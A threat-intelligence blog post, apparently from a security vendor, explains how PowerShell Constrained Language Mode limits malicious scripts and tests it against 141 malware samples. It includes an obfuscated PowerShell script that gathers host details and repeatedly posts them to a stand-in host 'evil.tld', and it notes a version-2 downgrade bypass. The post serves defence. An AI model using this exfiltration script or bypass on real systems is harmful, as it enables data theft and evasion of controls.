C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></a><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://www.linkedin.com/company/teamt5/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="light" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></a><style data-emotion="css 11g9kr1">.css-11g9kr1{-webkit-text-decoration:none;text-decoration:none;}</style><a class="css-3n5iv4 css-11g9kr1" href="https://twitter.com/teamt5_official/"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="light" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></a></div></div></div></div></div></nav></div><div class="css-1b3tozc"></div></header></div><main class="css-iwv7r0"><div class="css-ht0vth"><div class="css-w4jotj" style="background-image:url(https://res.cloudinary.com/dvgomg5gh/image/upload/f_auto/f_auto/v1612249236/pexels_brett_sayles_3803517_1c8f3c2bfa.jpg)"></div><div class="css-1vd4pj2"><div class="css-f24dyb"><div style="background-color:#64cda2" class="css-1f7e94x">技術分析</div><a class="css-cf47rh">RSS</a></div><h1>A Deep Dive into PowerShell&#x27;s Constrained Language Mode</h1></div></div><div class="css-14r7lg1 default"><div class="css-8x5obk"><div class="css-t9u2dq"><div class="css-1isrddr"><div class="css-4api5d"><div>2021. 02. 17</div><div class="css-57sp39"></div><div>Cyber Threat Intelligence</div></div><div class="css-k6q0dt">Share:<div class="css-3ostf4"><a class="css-8xetqx"><button aria-label="linkedin" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="dark" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 4.92149239,7.30085217 6.05809022,7.30085217 C7.19468804,7.30085217 8.11619891,6.37952609 8.11619891,5.24292826 C8.11619891,4.10614565 7.19468804,3.18481957 6.05809022,3.18481957 Z" id="Combined-Shape"></path></g></g></svg></div></button></a><a class="css-8xetqx"><button aria-label="twitter" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="sns/twitter/hover" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M3,0 L21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 Z M9.40543979,19.2 C15.5354921,19.2 18.8873246,14.1204188 18.8873246,9.71811518 C18.8873246,9.57298429 18.8873246,9.4278534 18.8804136,9.28963351 C19.5300471,8.81968586 20.0967487,8.23225131 20.5459634,7.56188482 C19.9516178,7.82450262 19.3088953,8.00418848 18.6316178,8.08712042 C19.3227173,7.67246073 19.8479529,7.02282723 20.0967487,6.24188482 C19.4540262,6.62198953 18.7421937,6.89842932 17.9819843,7.0504712 C17.3738168,6.4008377 16.5099424,6 15.5493141,6 C13.7109895,6 12.2182147,7.49277487 12.2182147,9.33109948 C12.2182147,9.59371728 12.2458586,9.84942408 12.3080576,10.0913089 C9.53674869,9.95308901 7.08334555,8.62617801 5.4385288,6.60816754 C5.15517801,7.09884817 4.98931414,7.67246073 4.98931414,8.28062827 C4.98931414,9.4347644 5.57674869,10.4575916 6.47517801,11.0519372 C5.92920942,11.0381152 5.41779581,10.8860733 4.96858115,10.6372775 C4.96858115,10.6510995 4.96858115,10.6649215 4.96858115,10.6787435 C4.96858115,12.2959162 6.11580628,13.6366492 7.64313613,13.947644 C7.36669634,14.0236649 7.06952356,14.0651309 6.76543979,14.0651309 C6.55119895,14.0651309 6.34386911,14.0443979 6.13653927,14.0029319 C6.55810995,15.3298429 7.78826702,16.2904712 9.24648691,16.3181152 C8.10617277,17.2096335 6.66868586,17.7417801 5.10680105,17.7417801 C4.83727225,17.7417801 4.57465445,17.7279581 4.31203665,17.6934031 C5.77025654,18.6471204 7.52564921,19.2 9.40543979,19.2"></path></g></svg></div></button></a><a class="css-8xetqx"><button aria-label="facebook" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24" version="1.1"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><path class="dark" d="M22,0 C23.1045695,-2.02906125e-16 24,0.8954305 24,2 L24,22 C24,23.0543618 23.1841222,23.9181651 22.1492623,23.9945143 L22,24 L22,24 L14,24 L14,23.978 L13.875,24 L13.875,15.5633307 L16.6710937,15.5633307 L17.203125,12.0733717 L13.875,12.0733717 L13.875,9.80860051 C13.875,8.85381375 14.3398828,7.92315016 15.8305781,7.92315016 L15.8305781,7.92315016 L17.34375,7.92315016 L17.34375,4.95196885 C17.34375,4.95196885 15.9704766,4.71616081 14.6575781,4.71616081 C11.9165156,4.71616081 10.125,6.3875682 10.125,9.41345698 L10.125,9.41345698 L10.125,12.0733717 L7.078125,12.0733717 L7.078125,15.5633307 L10.125,15.5633307 L10.125,24 C10.0832306,23.9934058 10.0415327,23.9865949 9.99990751,23.9795684 L10,24 L2,24 C0.8954305,24 1.3527075e-16,23.1045695 0,22 L0,2 C-1.3527075e-16,0.8954305 0.8954305,2.02906125e-16 2,0 L22,0 Z" id="path-1"></path></g></svg></div></button></a></div></div></div><div class="css-17crpi9"><div class="css-x9vory"><div><p>*Image courtesy of <a href="https://www.pexels.com/zh-tw/photo/3803517/">Pexels</a></p><h2 id="what-is-constrained-language-mode-and-why-it-matters">What is Constrained Language Mode and Why it Matters</h2><p>When PowerShell was <a href="https://betanews.com/2006/11/14/windows-powershell-1-0-released/">first announced in 2006</a>, it was meant to be a flexible command-line shell that features an easy-to-understand yet advanced scripting engine for IT admins. Fast forward to (almost) a decade and a half later, PowerShell has caught up in popularity and has superseded the now-legacy <code>cmd.exe</code> in current Windows 10 releases.</p><p>However, PowerShell has also been weaponized heavily over the past decade. There is an abundance of PowerShell-based samples all over public sandboxes, and <a href="https://attack.mitre.org/techniques/T1059/001/">APTs are known to abuse it whenever possible</a>. The advanced scripting engine is often utilized to launch fileless/in-memory attacks or <a href="https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/">use it as a way around AMSI</a>. In this post, we will be focusing on a lesser-known feature that can be used to combat this threat: Language Mode.</p><p>PowerShell was launched with an option to change its <a href="https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes">&quot;Language Mode&quot;</a>. This Language Mode option allows the user to switch between syntaxes allowed or disallowed. By default, all PowerShell sessions are launched with <code>FullLanguage</code>, which permits all the available syntaxes and cmdlets at runtime. There are four total language modes available: <code>FullLanguage</code>, <code>RestrictedLanguage</code>, <code>NoLanguage</code> and finally <code>ConstrainedLanguage</code>. In today&#x27;s topic, we are here to focus on the <code>ConstrainedLanguage</code> mode introduced in PowerShell 3.0.</p><br/><h3 id="safer-powershell-environment">Safer PowerShell Environment</h3><p>First off, let&#x27;s take a look at what Microsoft Docs says about the <code>ConstrainedLanguage</code> mode:</p><blockquote><ul><li><div>All cmdlets in Windows modules, and other UMCI-approved cmdlets, are fully functional and have complete access to system resources, except as noted.</div></li><li><div>All elements of the PowerShell scripting language are permitted.</div></li><li><div>All modules included in Windows can be imported and all commands that the modules export run in the session.</div></li><li><div>In PowerShell Workflow, you can write and run script workflows (workflows written in the PowerShell language). XAML-based workflows are not supported and you cannot run XAML in a script workflow, such as by using Invoke-Expression -Language XAML. Also, workflows cannot call other workflows, although nested workflows are permitted.</div></li><li><div>The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.</div></li><li><div>The New-Object cmdlet can be used only on allowed types (listed below).</div></li><li><div>Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.</div></li><li><div>Type conversion is permitted, but only when the result is an allowed type.</div></li><li><div>Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.</div></li><li><div>The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.</div></li><li><div>Users can get all properties of allowed types. Users can set the values of properties only on Core types. Only the following COM objects are permitted:
<ul><li><div>Scripting.Dictionary</div></li><li><div>Scripting.FileSystemObject</div></li><li><div>VBScript.RegExp</div></li></ul></div></li></ul></blockquote><br/><h4 id="no-arbitrary-c-code-via-add-type">No Arbitrary C# Code via Add-Type</h4><blockquote><p>The Add-Type cmdlet can load signed assemblies, but it cannot load arbitrary C# code or Win32 APIs.</p></blockquote><p>Many PowerShell-based exploits rely on .NET-based language compilation via <code>Add-Type</code> - and that&#x27;s already thrown out the window by disallowing arbitrary C# code compilation.</p><p><img alt="202101-1.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_1_38111256c4.png" class="css-1h5x3dy"/></p><br/><h4 id="non-whitelisted-types-are-prohibited">Non-whitelisted Types are Prohibited</h4><blockquote><ul><li><div>The New-Object cmdlet can be used only on allowed types (listed below).</div></li><li><div>Only allowed types (listed below) can be used in PowerShell. Other types are not permitted.</div></li><li><div>Type conversion is permitted, but only when the result is an allowed type.</div></li><li><div>Cmdlet parameters that convert string input to types work only when the resulting type is an allowed type.</div></li><li><div>The ToString() method and the .NET methods of allowed types (listed below) can be invoked. Other methods cannot be invoked.</div></li></ul></blockquote><p>In laymen&#x27;s terms, every non-whitelisted type and its methods/properties are blocked from execution. Classes such as <code>System.Reflection.Assembly</code>/<code>System.Convert</code>/<code>System.Runtime.CompilerServices</code> and many more are out-of-reach for threat actors, making code injection or fileless attacks that rely on additional PEs much more difficult.</p><p><img alt="202101-2.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_2_ec73ef8561.png" class="css-1h5x3dy"/></p><br/><h3 id="prohibit-complex-scripts-from-executing">Prohibit Complex Scripts from Executing</h3><p>Given the above limitations, this does mean that legitimate complex scripts may not be able to execute correctly. For instance, if your organization uses a script that utilizes WinForm or WPF (Windows Presentation Framework), those will not work at all.</p><p><img alt="202101-3.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_3_80ad190a95.png" class="css-1h5x3dy"/></p><p>Consequentially, modules are affected by this whitelisting system as well. Modules that rely on created types or non-whitelisted type calls will not load properly.</p><p><img alt="202101-4.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230067/202101_4_aa876d7833.png" class="css-1h5x3dy"/></p><p>Therefore, it is crucial to <strong>double-check your organization&#x27;s scripts</strong> (if you have any) <em>before</em> enrolling this policy to your endpoints.</p><br/><h3 id="require-explicit-feature-enrollment">Require Explicit Feature Enrollment</h3><p>Since, by default, this language mode is an opt-in feature, the user would either have to call <code>$ExecutionContext.SessionState.LanguageMode = &quot;ConstrainedLanguage&quot;</code> at the beginning of each session or add <code>__PSLockdownPolicy</code> to the system environment variables (<strong>DO NOT</strong> do this for production. <a href="#beware-of-pslockdownpolicy">See the section below</a>. Neither of which is ideal and should only be used for debugging, unit testing, or for general testing purposes only.</p><p>Instead, the administrator(s) of your organization should deploy via WDAC (Windows Defender Application Control) on Windows 10+ <em>or</em> via AppLocker on Windows 7+. When implemented this way, the attacker will first have to bypass WDAC or AppLocker before gaining full control of a standard PowerShell session. A guideline regarding the deployment for individual or mass number of endpoints can be found under the <a href="https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control">Application Control for Windows</a> article on Microsoft Docs.</p><br/><h3 id="effective-against-scripts-not-standard-cmdlets">Effective Against Scripts, not Standard Cmdlets</h3><p>It must be made clear that merely enabling Constrained Language Mode is not enough to mitigate the risks PowerShell can bring. While restricting users to a lower-privileged language mode ensures no custom .NET assemblies or code can be executed, this does not stop attackers from crafting malicious scripts from the built-in cmdlets alone. For example, an attacker may still be able to craft a script that collects relevant intel about the computer and send it back to their C2 station.</p><p>The following, as an example, will continue to run fine under a PowerShell session with Constrained Language mode enabled.</p><pre><code class="lang-ps1">Start-Job -ScriptBlock {
 while($true){
  # MAC address collection
  .(&quot;{1}{3}{2}{0}&quot; -f &#x27;ariable&#x27;, &#x27;S&#x27;, &#x27;t-V&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ata&#x27;, &#x27;d&#x27;) -Value (.(&quot;{3}{2}{0}{1}&quot; -f &#x27;Ada&#x27;, &#x27;pter&#x27;, &#x27;Net&#x27;, &#x27;Get-&#x27;) | .(&quot;{1}{0}&quot; -f &#x27;ect&#x27;, &#x27;sel&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;erfac&#x27;, &#x27;Int&#x27;, &#x27;s&#x27;, &#x27;eAlia&#x27;), (&quot;{0}{1}{2}&quot; -f &#x27;MacA&#x27;, &#x27;d&#x27;, &#x27;dress&#x27;) | &amp;(&quot;{3}{2}{0}{1}&quot; -f &#x27;r&#x27;, &#x27;tTo-Json&#x27;, &#x27;e&#x27;, &#x27;Conv&#x27;) -Compress) &gt; $null
  # OSs + username collection
  .(&quot;{2}{0}{1}&quot; -f &#x27;-&#x27;, &#x27;Variable&#x27;, &#x27;Set&#x27;) -Name (&quot;{0}{1}&quot; -f &#x27;d&#x27;, &#x27;ata&#x27;) -Value (${D`ATa} + (.(&quot;{0}{2}{3}{1}&quot; -f &#x27;Ge&#x27;, &#x27;nce&#x27;, &#x27;t-CimInst&#x27;, &#x27;a&#x27;) (&quot;{1}{0}{3}{2}&quot; -f &#x27;ting&#x27;, &#x27;Win32_Opera&#x27;, &#x27;em&#x27;, &#x27;Syst&#x27;) | .(&quot;{0}{1}&quot; -f &#x27;se&#x27;, &#x27;lect&#x27;) (&quot;{0}{1}&quot; -f &#x27;na&#x27;, &#x27;me&#x27;), (&quot;{1}{0}&quot; -f &#x27;me&#x27;, &#x27;CSNa&#x27;) | &amp;(&quot;{2}{3}{1}{0}{4}&quot; -f &#x27;o-Js&#x27;, &#x27;T&#x27;, &#x27;Conve&#x27;, &#x27;rt&#x27;, &#x27;on&#x27;) -Compress)) &gt; $null
  # WAN IP collection
  &amp;(&quot;{0}{1}{2}{3}&quot; -f &#x27;Set-&#x27;, &#x27;Vari&#x27;, &#x27;abl&#x27;, &#x27;e&#x27;) -Name (&quot;{1}{0}&quot; -f &#x27;ta&#x27;, &#x27;da&#x27;) -Value (${D`AtA} + ((.(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) -useb (&quot;{1}{0}{2}&quot; -f &#x27;fig&#x27;, &#x27;ifcon&#x27;, &#x27;.me&#x27;) -user (&quot;{0}{1}&quot; -f &#x27;cur&#x27;, &#x27;l&#x27;)).&quot;cO`NTe`Nt&quot;)) &gt; $null
  # Saves data to a temporary file (usually this is done in-memory by threat actors, but in-memory execution purely based on existing cmdlets is either impossible or very difficult)
  .(&quot;{1}{0}{2}&quot; -f &#x27;-Variabl&#x27;, &#x27;Set&#x27;, &#x27;e&#x27;) -Name (&#x27;a&#x27;) -Value (&quot;$env:temp\$(New-Guid).txt&quot;)
  ${Da`Ta} | &amp;(&quot;{1}{2}{0}&quot; -f &#x27;le&#x27;, &#x27;O&#x27;, &#x27;ut-Fi&#x27;) ${a}
  # Compresses the file
  &amp;(&quot;{3}{0}{2}{1}&quot; -f &#x27;ompr&#x27;, &#x27;Archive&#x27;, &#x27;ess-&#x27;, &#x27;C&#x27;) -De &quot;$a.zip&quot; -Co (&quot;{0}{1}&quot; -f &#x27;Op&#x27;, &#x27;timal&#x27;) -Lit ${a}
  # Sends it back to the C2 station
  &amp;(&quot;{1}{0}&quot; -f &#x27;r&#x27;, &#x27;iw&#x27;) (&quot;{0}{2}{3}{4}{1}&quot; -f &#x27;h&#x27;, &#x27;00&#x27;, &#x27;ttp://evil&#x27;, &#x27;.tld:&#x27;, &#x27;80&#x27;) -method (&quot;{1}{0}&quot; -f &#x27;st&#x27;, &#x27;po&#x27;) -body (.(&quot;{1}{0}{2}&quot; -f &#x27;Co&#x27;, &#x27;Get-&#x27;, &#x27;ntent&#x27;) -Lit &quot;$a.zip&quot;) &gt; $null
  &amp;(&quot;{2}{1}{0}&quot; -f &#x27;leep&#x27;, &#x27;t-S&#x27;, &#x27;Star&#x27;) -Seconds 2
  }
}</code></pre><p>Additionally, attackers may still be able to call external resources to achieve their goal, such as achieving persistence via <code>schtask</code> or placing additional payloads under <code>shell:startup</code>. Remember, Constrained Language mode does <strong>NOT</strong> block most existing cmdlets from functioning; in other words, it limits what the threat actor has on their disposal, but does not mean that they cannot make do with vanilla cmdlets or standard Windows applications.</p><br/><h4 id="beware-of-pslockdownpolicy">Beware of <code>__PSLockdownPolicy</code></h4><p>Aside from weaponizing existing cmdlets, if the admins had &quot;enabled&quot; the language feature via <code>__PSLockdownPolicy</code>, then it would be trivial for attackers with administrative privileges to restore the language policy. Let&#x27;s take a look at what this environment variable actually does.</p><p><img alt="202101-5.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230068/202101_5_707aff90b6.png" class="css-1h5x3dy"/></p><p>We&#x27;ll see that it has brought us to the <code>SystemPolicy</code> class under the <code>wldpNativeMethods.cs</code> file. In various articles that reference this environment variable, they would instruct the administrator to set the <code>__PSLockdownPolicy</code> variable to <code>4</code>. A value of 4 corresponds with the <code>WLDP_LOCKDOWN_UMCIENFORCE_FLAG</code> constant, which indicates the enforcement of UMCI (User-mode Code Integrity).</p><p><img alt="202101-6.gif" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230069/202101_6_2a4f7bdb5c.gif" class="css-1h5x3dy"/></p><p>The call&#x27;s parent method happens to be named <code>GetDebugLockdownPolicy</code>, which indicates that this behavior was meant to be a debug feature, rather than something that should be in a production environment.</p><p><img alt="202101-7.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230072/202101_7_4f3622def2.png" class="css-1h5x3dy"/></p><p>This theory is further backed up by the statement made by <a href="https://twitter.com/mattifestation/status/921509830644269062">Matt Graeber</a>, a renowned security researcher well-versed in WDAC. Further research also shows this behavior was mentioned by the PowerShell team in its <a href="https://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/">official post regarding Constrained Language Mode as well</a>:</p><blockquote><p>As part of the implementation of Constrained Language, PowerShell included an environment variable for debugging and unit testing called <code>__PSLockdownPolicy</code>. While we have never documented this, some have discovered it and described this as an enforcement mechanism. This is unwise because an attacker can easily change the environment variable to remove this enforcement. In addition, there are also file naming conventions that enable FullLanguage mode on a script, effectively bypassing Constrained Language.</p></blockquote><p>It must be emphasized that administrators should <strong>NOT</strong> deploy this to their endpoints as a way to enable Constrained Language mode - and be extra mindful when reading through articles regarding security features.</p><br/><h3 id="compatibility-with-legacy-oss">Compatibility with Legacy OSs</h3><p>Another thing to consider before rolling this feature out to endpoints is legacy OSs. As mentioned at the beginning of this post, Constrained Language mode is only available on PowerShell 3.0 onwards - and Windows 7 ships with PowerShell 2.0 by default.</p><p><img alt="202101-8.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230074/202101_8_6103f884e7.png" class="css-1h5x3dy"/></p><p>While it is possible to install WMF 5.1 on older systems such as Windows 7, these systems likely ship with PowerShell 2.0 as its core component as well, which is susceptible to <em>downgrade attacks</em>.</p><p>All the attacker needs to do is, instead of starting a standard PowerShell 5.1 session, spawn a PowerShell 2.0 session using <code>PowerShell.exe -Version 2</code>. Since <code>ConstrainedLanguage</code> mode doesn&#x27;t exist in that version, it will simply fallback to using <code>FullLanguage</code>.</p><p><img alt="202101-9.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230075/202101_9_7d51c2552d.png" class="css-1h5x3dy"/></p><p>This is much less of a problem on Windows 10, as PowerShell 5.1 is shipped with the system by default and 2.0 can be removed by using <code>Disable-WindowsOptionalFeature -Online -FeatureName MicrosoftWindowsPowerShellV2Root</code>. After then, any attempts to launch PowerShell v2 will result in an error message.</p><pre><code class="lang-text">PS C:\&gt; powershell -v 2
Encountered a problem reading the registry.  Cannot find registry key SOFTWARE\Microsoft\PowerShell\1\PowerShellEngine. The Windows PowerShell 2 engine is not installed on this computer.</code></pre><br/><h2 id="hypothetical-testing">Hypothetical Testing</h2><p>To see how effective this mode is against hypothetical attacks, we ...</p><ul><li><div>gathered 141 recently-submitted unique PowerShell samples as of Jan 27th, 2021.
<ul><li><div>These samples were randomly chosen and were not handpicked (aside from picking out invalid samples that aren&#x27;t <code>*.ps1</code> scripts) in any way.</div></li></ul></div></li><li><div>executed the scripts via <code>ls -File | %{start-job -scr {iex $args[0]} -arg $_.FullName}</code>.</div></li><li><div>ran these samples on a system with <code>ConstrainedLanguage</code> mode enabled.</div></li><li><div>ran these samples on a Windows 10 (build 19042) system with a non-elevated PowerShell session.
<ul><li><div>Elevation is taken out of the equation as attackers would have to escalate its privilege first, and by that point there will be bigger problems to worry about.</div></li></ul></div></li></ul><p><img alt="202101-10.png" src="https://res.cloudinary.com/dvgomg5gh/image/upload/v1612230077/202101_10_0e10676b7f.png" class="css-1h5x3dy"/></p><br/><p>In our testing,</p><ul><li><div><code>ConstrainedLanguage</code> blocked ...
<ul><li><div>100% (141/141) of the samples from executing properly.
<ul><li><div>... as in reaching their intended goal of launching a TCP shell, loading its next-stage payload, creating usable persistence, etc.</div></li></ul></div></li><li><div>51% (72/141) of the samples that had attempted to create a non-whitelisted type.</div></li><li><div>50% (71/141) of the samples that had attempted to invoke a method on non-whitelisted type.</div></li><li><div>26.9% (38/141) of the samples that had attempted to convert a value into a non-whitelisted type.</div></li><li><div>2.8% (4/141) of the samples that had attempted to set a property on a non-whitelisted type.</div></li></ul></div></li><li><div><code>ConstrainedLanguage</code> failed to block ...
<ul><li><div>0.7% (1/141) of the samples that had managed to create persistence entries.</div></li></ul></div></li></ul><br/><h2 id="conclusion">Conclusion</h2><p>Since PowerShell is now <a href="https://support.microsoft.com/en-us/windows/powershell-is-replacing-command-prompt-fdb690cf-876c-d866-2124-21b6fb29a45f">an integral part</a> of modern Windows OSs, sysadmins should not underestimate the risks that PowerShell can bring to the organization.</p><p>In the article, we went through the benefits and drawbacks of <code>ConstrainedLanguage</code> and how it performs in a hypothetical test. By enabling the engine feature, the risk of PowerShell-introduced exploitation is greatly lowered - if enrolled properly. Organizations should also consider whether or not the reduced availability of modules and or scripts is worth the tradeoff before enrolling this language policy.</p><br/></div></div></div><div class="css-1h6gcr1"><div class="css-2uv98o">Share:<div class="css-3ostf4"><a class="css-18hi9tf"><button aria-label="linkedin" class="react-share__ShareButton share" style="background-color:transparent;border:none;padding:0;font:inherit;color:inherit;cursor:pointer"><div class="css-6tkolk"><svg width="24px" height="24px" viewBox="0 0 24 24"><g id="Symbols" stroke="none" stroke-width="1" fill="none" fill-rule="evenodd"><g id="sns/linkedin/nor"><path class="dark" d="M21,0 C22.6568542,-3.04359188e-16 24,1.34314575 24,3 L24,21 C24,22.6568542 22.6568542,24 21,24 L3,24 C1.34314575,24 2.02906125e-16,22.6568542 0,21 L0,3 C-2.02906125e-16,1.34314575 1.34314575,3.04359188e-16 3,0 L21,0 Z M19.0257087,9.0309163 C16.1146435,7.90189457 14.1125239,9.13845978 13.5311978,10.2828185 L13.5311978,10.2828185 L13.4415783,10.4056989 L13.3876217,10.4056989 L13.3876217,8.83634022 L10.0184804,8.83634022 L10.0184804,20.1829163 L13.5311978,20.1829163 L13.5316179,14.0152782 C13.5352018,13.9482549 13.5643166,13.4915116 13.7156109,12.9431337 C13.879513,12.3490576 14.4018935,11.8678837 15.0368065,11.7243076 C15.6717196,11.5811011 16.2554478,11.7243076 16.5934152,11.8678837 C16.9313826,12.0110902 17.1054478,12.3643946 17.1745565,12.471938 C17.2436652,12.5794815 17.458937,13.2476554 17.458937,13.6240576 L17.458937,13.6240576 L17.458937,20.1829163 L20.9921652,20.1829163 L20.9927319,13.1625978 C21.0044427,12.9799919 21.1719641,9.86344891 19.0257087,9.0309163 Z M7.82684783,8.83641413 L4.2731087,8.83641413 L4.2731087,20.1828054 L7.82684783,20.1828054 L7.82684783,8.83641413 Z M6.05809022,3.18481957 C4.92149239,3.18481957 3.99998152,4.10614565 3.99998152,5.24292826 C3.99998152,6.37952609 